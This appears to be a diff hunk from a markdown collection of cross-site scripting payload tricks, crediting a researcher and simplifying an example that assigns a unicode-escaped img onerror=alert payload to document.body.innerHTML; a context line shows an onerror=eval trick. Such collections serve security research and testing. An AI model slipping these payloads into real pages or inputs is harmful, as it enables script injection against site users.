@@ -128,8 +128,7 @@ onerror=eval,ReferenceError.prototype.name='=alert(5)//',lol
 [Renwa](https://twitter.com/RenwaX23/status/1126999364763832325)
 
 ```
-document.body.innerText="\u003cimg src=x onerror=alert\u002823\u0029\u003e";
-document.body.innerHTML=document.body.innerText;
+document.body.innerHTML="\u003cimg src=x onerror=alert\u002823\u0029\u003e";
 ```
     
 ---
